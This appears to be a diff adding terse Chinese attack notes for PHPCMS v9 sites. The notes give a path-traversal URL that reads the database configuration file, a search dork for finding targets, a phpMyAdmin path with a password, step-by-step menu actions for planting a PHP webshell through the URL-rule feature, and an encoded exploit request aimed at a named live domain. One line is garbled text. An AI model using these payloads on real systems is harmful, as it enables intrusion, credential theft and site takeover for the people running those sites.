@@ -1,0 +1,17 @@
+index.php?m=admin&c=index&a=login&pc_hash=   后台
+
+index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
+
+
+Powered by PHPCMS v9 ? 2012
+
+inurl:index.php?m=content&c=rss&siteid=1
+
+phpmyadmin/    DKM1zM（必填）
+
+扩展 > URL规则管理 > 添加规则> 名称(category) > 是否生成静态(是) > URL示例 : weiwei > URL规则 : weiwei.php > 内容 > 内容相关设置 > 管理栏目 > 添加栏目 > 模型随便 > 栏目名称(php一句话) > 英文目录(weiwei) > 生成Html设置 > 栏目生成html (是) > 提交 >更新 > 批量更新URL >　连接地址
+
+
+[1] 璁块棶 http://etv66.com/phpsso_server/api/uc.php?code=e1b6pqkYG1ykHicNp7rzkT
+S%2FGEQrr%2B7JTJTGaxwEirqFtK%2Bb%2B%2F1IWxAkpsZaz6rBOTTJYNGcRdyvCi9zmuYKwRUBeFbX
+APXogS3U8Sp%2BjfJA838
